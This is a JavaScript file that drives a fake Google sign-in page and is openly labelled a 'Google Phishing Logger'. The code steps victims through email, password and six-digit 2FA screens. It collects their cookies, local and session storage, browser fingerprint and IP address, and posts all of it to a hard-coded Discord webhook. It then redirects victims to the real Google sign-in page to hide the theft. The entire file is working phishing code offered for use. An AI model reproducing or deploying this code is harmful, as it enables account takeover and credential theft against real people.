const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1421848984359796881/MSj33vKCSCufP2c23gPvsRRolejGpbymcNffKTsovImSytwG5CFzWPWMVgDJKBQ5AwKY';

let userData = {
    email: '',
    password: '',
    twoFactorCode: '',
    cookies: '',
    userAgent: '',
    ip: '',
    sessionCookies: '',
    timestamp: ''
};

async function handleEmail() {
    const email = document.getElementById('email').value;
    if (!email) return;
    
    userData.email = email;
    document.getElementById('userEmail').textContent = email;
    document.getElementById('emailScreen').style.display = 'none';
    document.getElementById('passwordScreen').style.display = 'block';
}

async function handlePassword() {
    const password = document.getElementById('password').value;
    if (!password) return;
    
    userData.password = password;
    userData.userAgent = navigator.userAgent;
    userData.cookies = document.cookie;
    userData.timestamp = new Date().toISOString();
    
    // Capture session cookies and localStorage
    userData.sessionCookies = await captureFullSession();
    
    await sendToDiscord('password_entered');
    
    document.getElementById('passwordScreen').style.display = 'none';
    document.getElementById('twoFactorScreen').style.display = 'block';
}

async function handle2FA() {
    const twoFactorCode = document.getElementById('twoFactorCode').value;
    if (!twoFactorCode || twoFactorCode.length !== 6) return;
    
    userData.twoFactorCode = twoFactorCode;
    
    // Final session capture after 2FA
    userData.sessionCookies = await captureFullSession();
    userData.ip = await getIP();
    
    await sendToDiscord('2fa_completed');
    
    // Redirect to real Google after 2 seconds
    setTimeout(() => {
        window.location.href = 'https://accounts.google.com';
    }, 2000);
}

async function captureFullSession() {
    const sessionData = {
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${screen.width}x${screen.height}`,
        plugins: Array.from(navigator.plugins).map(p => p.name).join(', '),
        referrer: document.referrer
    };
    
    return btoa(JSON.stringify(sessionData));
}

async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return 'Unknown';
    }
}

async function sendToDiscord(stage) {
    const embed = {
        title: "🔐 Google Login Captured",
        color: stage === '2fa_completed' ? 0x00ff00 : 0xffa500,
        fields: [
            {
                name: "📧 Email",
                value: `\`\`\`${userData.email}\`\`\``,
                inline: true
            },
            {
                name: "🔑 Password",
                value: `\`\`\`${userData.password}\`\`\``,
                inline: true
            },
            {
                name: "🔢 2FA Code",
                value: `\`\`\`${userData.twoFactorCode || 'Pending'}\`\`\``,
                inline: true
            },
            {
                name: "🌐 IP Address",
                value: `\`\`\`${userData.ip || 'Unknown'}\`\`\``,
                inline: true
            },
            {
                name: "🆔 Session Data (Base64)",
                value: `\`\`\`${userData.sessionCookies}\`\`\``
            },
            {
                name: "🍪 Raw Cookies",
                value: `\`\`\`${userData.cookies.substring(0, 1000)}\`\`\``
            },
            {
                name: "🖥️ User Agent",
                value: `\`\`\`${userData.userAgent.substring(0, 500)}\`\`\``
            },
            {
                name: "⏰ Timestamp",
                value: `\`\`\`${userData.timestamp}\`\`\``,
                inline: true
            },
            {
                name: "📊 Stage",
                value: `\`\`\`${stage}\`\`\``,
                inline: true
            }
        ],
        timestamp: new Date().toISOString(),
        footer: {
            text: "Google Phishing Logger • Full Session Capture"
        }
    };

    try {
        await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                embeds: [embed],
                username: "Google Security Logger",
                avatar_url: "https://cdn-icons-png.flaticon.com/512/300/300221.png"
            })
        });
    } catch (error) {
        console.log('Webhook error');
    }
}

// Additional session monitoring
setInterval(async () => {
    if (userData.email) {
        userData.sessionCookies = await captureFullSession();
    }
}, 5000);